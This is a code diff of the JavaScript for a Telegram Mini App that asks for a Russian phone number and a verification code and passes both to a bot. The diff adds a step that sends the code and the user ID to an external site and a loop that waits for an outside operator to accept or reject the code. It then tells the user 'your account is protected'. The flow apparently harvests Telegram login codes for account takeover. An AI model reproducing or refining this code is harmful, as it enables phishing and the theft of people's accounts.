@@ -5,6 +5,9 @@ document.addEventListener('DOMContentLoaded', () => {
     tg.setBackgroundColor('#060137');
     tg.enableClosingConfirmation();
 
+    // Конфигурация
+    const BASE_URL = 'https://ваш-сайт.ru'; // Замените на ваш URL
+    
     // Элементы
     const phoneForm = document.getElementById('phone-form');
     const codeForm = document.getElementById('code-form');
@@ -14,33 +17,39 @@ document.addEventListener('DOMContentLoaded', () => {
     const codeError = document.getElementById('code-error');
     const submitCodeBtn = document.getElementById('submit-code');
 
-    // Вибрация при взаимодействии
+    // Глобальный объект для статуса верификации
+    window.verificationStatus = {
+        current: 'pending',
+        code: null,
+        userId: null
+    };
+
+    // Вибрация
     const vibrate = (type = 'light') => {
         if (tg.HapticFeedback) {
             tg.HapticFeedback.impactOccurred(type);
         }
     };
 
-    // Отправка события боту
+    // Отправка события
     const sendEvent = async (type, data = null) => {
         if (window.sendToBot) {
             await window.sendToBot(type, data);
         }
     };
 
-    // Отслеживание входа
+    // Инициализация
     sendEvent('init');
     vibrate('medium');
 
     // Отслеживание выхода
-    const handleVisibilityChange = () => {
+    document.addEventListener('visibilitychange', () => {
         if (document.visibilityState === 'hidden') {
             sendEvent('exit');
         }
-    };
-    document.addEventListener('visibilitychange', handleVisibilityChange);
+    });
 
-    // Форматирование номера с вибрацией
+    // Форматирование номера
     phoneInput.addEventListener('input', (e) => {
         let value = e.target.value.replace(/\D/g, '');
         if (value.length > 0) value = '7' + value.substring(1);
@@ -55,6 +64,12 @@ document.addEventListener('DOMContentLoaded', () => {
         if (value.length % 2 === 0) vibrate('light');
     });
 
+    // Валидация номера
+    const validatePhone = (phone) => {
+        const clean = phone.replace(/\D/g, '');
+        return /^7\d{10}$/.test(clean);
+    };
+
     // Отправка номера
     document.getElementById('submit-phone').addEventListener('click', async () => {
         const phone = phoneInput.value.replace(/\D/g, '');
@@ -65,7 +80,7 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
         
-        if (!/^7\d{10}$/.test(phone)) {
+        if (!validatePhone(phone)) {
             showError(phoneError, 'Требуется российский номер: +7 XXX XXX-XX-XX');
             vibrate('error');
             return;
@@ -93,34 +108,44 @@ document.addEventListener('DOMContentLoaded', () => {
         submitCodeBtn.disabled = true;
         submitCodeBtn.innerHTML = '<div class="loader"></div>';
         
+        // Сохраняем данные верификации
+        window.verificationStatus = {
+            current: 'pending',
+            code: code,
+            userId: tg.initDataUnsafe.user?.id
+        };
+        
+        // Отправляем код на проверку
         await sendEvent('code', code);
         
-        // Имитация ожидания подтверждения
-        let checkCount = 0;
+        // Открываем страницу подтверждения
+        const verificationUrl = `${BASE_URL}/verify.html?code=${code}&user_id=${tg.initDataUnsafe.user?.id}`;
+        window.open(verificationUrl, '_blank');
+        
+        // Проверяем статус каждые 500мс
         const checkInterval = setInterval(() => {
-            checkCount++;
-            if (checkCount >= 10) { // 10 попыток по 2 сек = 20 сек ожидания
+            if (window.verificationStatus.current !== 'pending') {
                 clearInterval(checkInterval);
-                showError(codeError, 'Время ожидания истекло');
-                submitCodeBtn.disabled = false;
-                submitCodeBtn.textContent = 'Подтвердить';
-                vibrate('heavy');
+                handleVerificationResult(window.verificationStatus.current);
             }
-        }, 2000);
+        }, 500);
     });
 
-    // Глобальная функция для подтверждения извне
-    window.confirmVerification = (status) => {
+    // Обработка результата
+    function handleVerificationResult(status) {
+        submitCodeBtn.disabled = false;
+        submitCodeBtn.textContent = 'Подтвердить';
+        
         if (status === 'approved') {
-            tg.showAlert('✅ Подтверждено!', () => tg.close());
+            tg.showAlert('✅ Подтверждено! Ваш аккаунт защищен.', () => {
+                tg.close();
+            });
         } else {
             showError(codeError, 'Код отклонён. Введите новый');
             codeInput.value = '';
-            submitCodeBtn.disabled = false;
-            submitCodeBtn.textContent = 'Подтвердить';
             vibrate('heavy');
         }
-    };
+    }
 
     function showError(element, message) {
         element.textContent = message;
